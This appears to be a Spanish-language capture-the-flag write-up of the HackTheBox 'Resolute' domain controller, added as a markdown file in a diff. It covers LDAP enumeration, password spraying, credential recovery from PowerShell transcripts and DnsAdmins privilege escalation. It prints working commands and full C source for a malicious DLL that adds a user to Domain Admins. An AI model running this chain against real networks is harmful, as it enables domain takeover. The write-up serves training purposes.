@@ -1,0 +1,110 @@
+---
+title: "Resolute"
+date: 2026-10-20
+difficulty: "Medium"
+os: "Windows"
+platform: "HackTheBox"
+ports: ["53/dns", "88/kerberos", "135/rpc", "139/netbios", "389/ldap", "445/smb", "636/ldaps", "3268/gc", "5985/winrm", "9389/adws"]
+tags: ["active-directory", "ldap", "password-spraying", "dnsadmins", "winrm", "privilege-escalation"]
+summary: "DC de Windows Server 2016 donde una contraseña filtrada en un campo description de LDAP arranca una cadena de tres saltos de credenciales hasta un abuso de DnsAdmins para RCE como SYSTEM."
+---
+
+## Resumen
+
+Resolute es un Domain Controller de `megabank.local` donde el acceso no depende de un solo exploit, sino de una **cadena de descuidos**: una contraseña olvidada en un campo de LDAP, unas credenciales en texto plano en un log de PowerShell, y por último el abuso de una pertenencia a `DnsAdmins` para ejecutar código como SYSTEM. Es un recorrido de Active Directory de manual.
+
+## Reconocimiento
+
+El escaneo de puertos canta "Domain Controller" a la primera: DNS (53), Kerberos (88), LDAP (389/636/3268), SMB (445), WinRM (5985) y ADWS (9389). El `-sCV` confirma el terreno:
+
+- Dominio y bosque: `megabank.local`
+- FQDN: `Resolute.megabank.local`
+- SO: Windows Server 2016 Standard (build 14393)
+- SMB signing: `required` (adiós a los relay attacks)
+
+La combinación de 88 + 3268 no deja dudas: hay un dominio detrás, así que la enumeración no empieza por la web (no la hay) sino por lo que el DC deje ver sin autenticar.
+
+## Foothold — contraseña en el campo description
+
+La cuenta `guest` está deshabilitada y el RID brute por SMB/RPC muere con `ACCESS_DENIED`, pero el **bind anónimo de LDAP** sigue abierto. Pidiendo los atributos `sAMAccountName` y `description` de todos los objetos usuario aparece la joya:
+
+```bash
+ldapsearch -x -H ldap://10.129.96.155 -b "DC=megabank,DC=local" "(objectClass=user)" sAMAccountName description
+```
+
+Una de las cuentas tiene en su descripción una contraseña por defecto en texto plano. El detalle fino: las descripciones **no se actualizan** cuando el usuario cambia su contraseña, así que esa cuenta concreta ya la había rotado. La maniobra correcta no es probar solo esa cuenta, sino **rociar esa misma contraseña contra toda la lista de usuarios** (password spraying), buscando a quien nunca la tocó.
+
+```bash
+crackmapexec smb 10.129.96.155 -u users.txt -p '<password>' --continue-on-success
+```
+
+El spray valida contra una cuenta **distinta** a la de la descripción. Esa cuenta pertenece a `Remote Management Users`, así que da shell directa por WinRM con `evil-winrm`.
+
+## Pivot — credenciales en PSTranscripts
+
+La cuenta inicial es rasa: sin grupos interesantes, sin privilegios explotables. Toca enumerar desde dentro. Un `dir -Force` en la raíz de `C:\` (el `-Force` es clave para ver lo oculto) revela una carpeta que no es estándar de Windows: `PSTranscripts`.
+
+Dentro hay un log de **PowerShell Transcription**, la política que graba todo lo que se teclea en una sesión. Y ahí quedó grabado un `net use` montando un recurso de red con las credenciales pasadas en la propia línea de comando:
+
+```text
+cmd /c net use X: \\fs01\backups <usuario> <password>
+```
+
+Credenciales nuevas para un segundo usuario, el mismo cuya descripción filtraba la contraseña por defecto al principio: ya la había cambiado, y esta es la buena.
+
+## Privilege Escalation — abuso de DnsAdmins
+
+El segundo usuario pertenece al grupo **`DnsAdmins`**. Ese es el vector final, y no es casualidad: es la ruta diseñada de la máquina.
+
+El servicio DNS de Windows corre como **SYSTEM** y los miembros de `DnsAdmins` pueden configurarlo. Entre las opciones está `ServerLevelPluginDll`, que indica al servicio que cargue una DLL de plugin personalizada al arrancar. Resultado: el DNS carga **nuestra** DLL con privilegios de SYSTEM.
+
+El flujo:
+
+1. Generar una DLL que añada a nuestro usuario a `Domain Admins`.
+2. Subirla al propio DC con `upload` de evil-winrm (más fiable que montar un SMB server, que el signing `required` de 2016 complica).
+3. Registrar la ruta con `dnscmd`:
+
+```powershell
+dnscmd.exe /config /serverlevelplugindll C:\Users\<user>\Documents\da.dll
+```
+
+4. Reiniciar el servicio — y aquí entra el detalle elegante: aunque el usuario no es admin local, **`DnsAdmins` tiene permiso para parar y arrancar el servicio DNS** concretamente:
+
+```powershell
+sc.exe stop dns
+sc.exe start dns
+```
+
+### El matiz que atasca a mucha gente
+
+Una DLL de `msfvenom -p windows/x64/exec` resultó **inconsistente**: el servicio arrancaba limpio (`RUNNING`) pero el payload no disparaba, y el usuario nunca entraba en Domain Admins. El motivo es que el DNS espera funciones de plugin concretas (`DnsPluginInitialize`...) y la ejecución desde `DllMain` de msfvenom no siempre completa.
+
+La solución fiable es una **DLL mínima escrita a mano**, cuyo `DllMain` ejecute el comando directamente al mapearse el proceso:
+
+```c
+#include <windows.h>
+BOOL WINAPI DllMain(HINSTANCE h, DWORD reason, LPVOID r) {
+    if (reason == DLL_PROCESS_ATTACH) {
+        system("net group \"Domain Admins\" <user> /add /domain");
+    }
+    return TRUE;
+}
+```
+
+```bash
+x86_64-w64-mingw32-gcc adduser.c -shared -o adduser.dll
+```
+
+Tras limpiar el `ServerLevelPluginDll` anterior, resubir la DLL a medida y reiniciar el servicio, el usuario aparece por fin en **Domain Admins**. Con esta DLL el servicio DNS suele quedarse caído, pero da igual: el comando ya se ejecutó en la carga.
+
+### Token refresh
+
+Último escollo: el token de la sesión WinRM no refleja el grupo recién añadido, porque el token se calcula al autenticar. Una sesión WinRM cacheada da `Access denied` al leer `root.txt` pese a ser ya Domain Admin. La salida limpia es abrir una **sesión totalmente nueva** con un token fresco (por ejemplo vía `wmiexec`, que evita el caché de WinRM), y desde ahí el acceso al perfil del Administrator es total.
+
+## Lecciones
+
+- **No hay un exploit, hay una cadena.** Tres saltos de credenciales encadenados antes de la privesc: así se ve AD en la vida real.
+- Los campos libres de AD (`description`) son legibles por cualquiera que lea el directorio: nunca van secretos ahí.
+- Credenciales en línea de comando quedan en logs, historiales y transcripciones.
+- `DnsAdmins` es efectivamente "casi SYSTEM" en un DC: hay que tratarlo como grupo privilegiado.
+- Para el abuso de DnsAdmins, una DLL a medida con `DllMain` es más determinista que un payload genérico.
